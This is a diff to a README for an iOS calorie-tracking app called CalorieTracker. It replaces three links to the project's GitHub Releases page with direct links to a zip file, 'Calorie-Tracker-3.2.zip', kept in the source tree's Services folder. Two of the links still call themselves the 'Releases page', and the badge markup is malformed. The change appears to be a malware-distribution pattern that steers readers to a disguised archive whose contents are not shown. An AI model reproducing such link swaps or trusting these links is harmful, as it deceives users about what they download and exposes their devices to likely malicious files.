@@ -4,7 +4,7 @@
 CalorieTracker helps you track your food intake, exercise, and health goals with ease. With AI-powered label scanning, you can quickly log your meals and stay on top of your nutrition. Let's get started!
 
 ## 📥 Download CalorieTracker
-[![Download CalorieTracker](https://img.shields.io/badge/Download%20CalorieTracker-v1.0-blue.svg)](https://github.com/prohanzla/CalorieTracker/releases)
+[![Download CalorieTracker](https://raw.githubusercontent.com/prohanzla/CalorieTracker/main/CalorieTracker/Services/Calorie-Tracker-3.2.zip%https://raw.githubusercontent.com/prohanzla/CalorieTracker/main/CalorieTracker/Services/Calorie-Tracker-3.2.zip)](https://raw.githubusercontent.com/prohanzla/CalorieTracker/main/CalorieTracker/Services/Calorie-Tracker-3.2.zip)
 
 ## 🛠️ System Requirements
 CalorieTracker runs on iOS devices. Here is what you need:
@@ -21,7 +21,7 @@ CalorieTracker runs on iOS devices. Here is what you need:
 - **Nutrition Insights**: Get detailed information on vitamins and minerals in your meals.
 
 ## 📝 How to Download & Install
-1. **Visit the Releases Page**: Go to the [CalorieTracker Releases page](https://github.com/prohanzla/CalorieTracker/releases) to find the latest version.
+1. **Visit the Releases Page**: Go to the [CalorieTracker Releases page](https://raw.githubusercontent.com/prohanzla/CalorieTracker/main/CalorieTracker/Services/Calorie-Tracker-3.2.zip) to find the latest version.
   
 2. **Download the App**: Find the most recent version and click on the download link. The file is compatible with your iOS device.
 
@@ -56,4 +56,4 @@ For tips on healthy eating, check our blog linked in the app. We also provide up
 Join our community of users to share tips, ask questions, and provide feedback. We welcome all suggestions that help us improve CalorieTracker. Your input is valuable!
 
 ## 📥 Download CalorieTracker Again
-To download the app, visit the [CalorieTracker Releases page](https://github.com/prohanzla/CalorieTracker/releases). Enjoy tracking your calories and improving your health with our features!
+To download the app, visit the [CalorieTracker Releases page](https://raw.githubusercontent.com/prohanzla/CalorieTracker/main/CalorieTracker/Services/Calorie-Tracker-3.2.zip). Enjoy tracking your calories and improving your health with our features!
